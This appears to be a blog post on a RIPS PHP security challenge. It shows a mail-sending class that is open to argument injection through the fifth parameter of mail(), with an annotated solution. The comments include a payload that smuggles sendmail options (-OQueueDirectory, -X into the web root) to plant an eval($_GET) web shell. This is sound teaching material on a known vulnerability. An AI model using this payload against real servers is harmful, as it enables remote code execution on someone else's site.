---

title: rips-56
author: raxjs
tags: [php]

---

$DESCRIPTION

<!--more-->
{{< reference src="https://twitter.com/ripstech/status/1154752480611373058" >}}

# Code
{{< code language="php"  title="Challenge" expand="Show" collapse="Hide" isCollapsed="false" >}}
class Mailer {
    private function sanitize($email) {
        if(!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            return '';
        }

        return escapeshellarg($email);
    }

    public function send($data) {
        if(!isset($data['to'])) {
            $data['to'] = 'none@ripstech.com';
        } else {
            $data['to'] = $this->sanitize($data['to']);
        }

        if(!isset($data['from'])) {
            $data['from'] = 'none@ripstech.com';
        } else {
            $data['from'] = $this->sanitize($data['from']);
        }

        if(!isset($data['subject'])) {
            $data['subject'] = 'No Subject';
        }

        if(!isset($data['message'])) {
            $data['message'] = '';
        }

        mail($data['to'], $data['subject'], $data['message'], '', "-f" . $data['from']);
    }
}
$mailer = new Mailer();
$mailer->send($_POST);

{{< /code >}}

# Solution
{{< code language="php" highlight="" title="Solution" expand="Show" collapse="Hide" isCollapsed="true" >}}
class Mailer {
    private function sanitize($email) {
        // 2) $email is user input. this filter is not 
        // enough to prevent argument injection later in
        // step 3
        if(!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            return '';
        }

        return escapeshellarg($email);
    }

    public function send($data) {
        if(!isset($data['to'])) {
            $data['to'] = 'none@ripstech.com';
        } else {
            $data['to'] = $this->sanitize($data['to']);
        }

        if(!isset($data['from'])) {
            $data['from'] = 'none@ripstech.com';
        } else {
            $data['from'] = $this->sanitize($data['from']);
        }

        if(!isset($data['subject'])) {
            $data['subject'] = 'No Subject';
        }

        if(!isset($data['message'])) {
            $data['message'] = '';
        }
        // 3) argument injection in parameter 5 ($data['from'])
        mail($data['to'], $data['subject'], $data['message'], '', "-f" . $data['from']);
    }
}
$mailer = new Mailer();
// 1) send receives user input as argument
$mailer->send($_POST);

// [1] https://blog.sonarsource.com/why-mail-is-dangerous-in-php?redirect=rips
//
// var_dump(!filter_var('\'a."\'\ -OQueueDirectory=\%0D<?=eval($_GET[c])?>\ -X/var/www/html/"@a.php', FILTER_VALIDATE_EMAIL));
// bool(false)
// php > echo sanitize('\'a."\'\ -OQueueDirectory=\%0D<?=eval($_GET[c])?>\ -X/var/www/html/"@a.php');
// ''\''a."'\''\ -OQueueDirectory=\%0D<?=eval($_GET[c])?>\ -X/var/www/html/"@a.php'
// php > echo escapeshellcmd(sanitize('\'a."\'\ -OQueueDirectory=\%0D<?=eval($_GET[c])?>\ -X/var/www/html/"@a.php'));
// ''\\''a."\'\\\'\'\\ -OQueueDirectory=\\%0D\<\?=eval\(\$_GET\[c\]\)\?\>\\ -X/var/www/html/"@a.php\'

// $ cat /tmp/test-mail.sh
// #!/bin/sh
// 
// echo "$@" >> /tmp/test-mail.log
// 
// $ grep sendmail_path /etc/php7/php.ini
// sendmail_path = /tmp/test-mail.sh

// $ cat /tmp/test-mail.log
// -faaa@bbb.ru
// -f\a.\'\\'\'\ -OQueueDirectory=\%0D\<\?=eval\($_GET\[c\]\)\?\>\ -X/var/www/html/@a.php'

// mail(
//     string $to,
//     string $subject,
//     string $message,
//     array|string $additional_headers = [],
//     string $additional_params = ""
// ): bool
//
// additional_params (optional)
// The additional_params parameter can be used to pass additional flags
// as command line options to the program configured to be used when
// sending mail, as defined by the sendmail_path configuration
// setting. For example, this can be used to set the envelope sender
// address when using sendmail with the -f sendmail option.
// 
// This parameter is escaped by escapeshellcmd() internally to prevent
// command execution. escapeshellcmd() prevents command execution, but
// allows to add additional parameters. For security reasons, it is
// recommended for the user to sanitize this parameter to avoid adding
// unwanted parameters to the shell command.
// 
// Since escapeshellcmd() is applied automatically, some characters that
// are allowed as email addresses by internet RFCs cannot be used. mail()
// can not allow such characters, so in programs where the use of such
// characters is required, alternative means of sending emails (such as
// using a framework or a library) is recommended.
// 
// The user that the webserver runs as should be added as a trusted user
// to the sendmail configuration to prevent a 'X-Warning' header from
// being added to the message when the envelope sender (-f) is set using
// this method. For sendmail users, this file is /etc/mail/trusted-users.


{{< /code >}}